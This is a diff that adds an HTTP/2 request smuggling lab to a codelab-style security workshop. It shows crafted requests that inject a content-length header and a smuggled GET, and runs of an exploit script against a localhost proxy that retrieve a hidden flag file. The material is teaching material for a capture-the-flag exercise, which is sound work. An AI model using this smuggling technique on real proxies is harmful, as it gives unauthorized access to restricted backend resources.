@@ -284,8 +284,93 @@ Host: 127.0.0.1:80
 
       </google-codelab-step>
     
-      <google-codelab-step label="LAB 2: HTTP/2 (TODO)" duration="20">
-        
+      <google-codelab-step label="LAB 2: HTTP/2" duration="20">
+        <p>For this lab, the <a href="https://armeria.dev/" target="_blank">Armenia proxy</a> is used. The proxy route request to two different web applications base on the requested path. HTTP2 Request Smuggling will allow us to access path that were not intent to be public.</p>
+<p class="image-container"><img alt="HTTP2 request smuggling schema" src="img\\b2a0f95fd89cc78c.png"></p>
+<h2 is-upgraded>Detection</h2>
+<p>Before doing requests to hidden resources, we need to confirm the proxy and backend are vulnerable. To do this test, we are using path are known to have valid response.</p>
+<p>The following requests will test if the proxy transform HTTP2 request to HTTP1 without validation to unnecessary header such as the <code>content-length</code>.</p>
+<p>Request 1: </p>
+<table>
+<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>POST</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>/static/diagram_full_size.png</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>localhost:8443</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>application/x-www-form-urlencoded</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>content-length</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>0</code></p>
+</td></tr>
+<tr><td colspan="2" rowspan="1"><p><code>GET /static/styles.css HTTP/1.1<br>Host: webstatic:80<br><br><br></code></p>
+</td></tr>
+</table>
+<p>Request 2: </p>
+<table>
+<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>GET</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>/static/not_found</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>localhost:8443</code></p>
+</td></tr>
+</table>
+<p>The proxy supporting will sees two requests therefore will return two responses. If the second response is a 404, this means that the second request <code>/static/not_found</code>.</p>
+<p>However, if the second response return a <code>200 OK</code> with stylesheet (<code>style.css</code>), this means that the proxy generated an HTTP1 stream similar to the following.</p>
+<pre><code>POST /static/ HTTP/1
+host: localhost:8443
+content-length: 0
+
+GET /static/styles.css HTTP/1.1
+Host: localhost
+[...]
+
+GET /static/not_found HTTP/1
+host: localhost:8443
+[...]
+
+</code></pre>
+<p>Because, the <code>content-length</code> header is injected in the first request. The stream generated what would be seen by most web server as three request.</p>
+<p>Using the exploit script <strong>to detect</strong> the vulnerability.</p>
+<pre><code>&gt; python .\exploit_http2_hrs.py --host https://localhost:8443 --url1 /static/diagram_full_size.png --url1s /static/style.css  --url2 /static/not_found
+ [+] Request 1 /static/diagram_full_size.png =&gt; 200
+ [+] Request 2 /static/not_found =&gt; 200
+ [+] HRS successful: True
+ [+] Response from second request:
+b&#34;body {\n  margin: 0;\n  padding: [...]
+</code></pre>
+<h2 is-upgraded>Exploitation</h2>
+<p>The parameter <code>url1s</code> can be changed to modified the &#34;smuggled request&#34; and targeted alternative location. The target server/container can not be control by the <code>Host</code> header. The proxy is directing the request base on the path of the first request.</p>
+<pre><code>&gt; python .\exploit_http2_hrs.py --host https://localhost:8443 --url1 /static/diagram_full_size.png --url1s /documents/flag.txt  --url2 /static/not_found
+ [+] Request 1 /static/diagram_full_size.png =&gt; 200
+ [+] Request 2 /static/not_found =&gt; 200
+ [+] HRS successful: True
+ [+] Response from second request:
+b&#39;This document should not be exposed.\r\n\r\nflag{documentsAccessGranted}&#39;
+</code></pre>
+<h2 is-upgraded>More about the exploit script</h2>
+<p>The exploit script has the following argument. The script is relativly simple. You can look at the source to see how the HTTP2 requests are built with httpx library.</p>
+<pre><code>&gt; python .\exploit_http2_hrs.py -h
+usage: exploit_http2_hrs.py [-h] [--host HOST] [--url1 URL1] [--url1s URL1S] [--url2 URL2] [--debug]
+
+HTTP2 Request Smuggling POC
+
+optional arguments:
+  -h, --help     show this help message and exit
+  --host HOST    target host
+  --url1 URL1    primary request&#39;s URL
+  --url1s URL1S  smuggled URL in the body of the primary request
+  --url2 URL2    secondary request&#39;s URL
+  --debug        display requests sent
+</code></pre>
+
 
       </google-codelab-step>
     
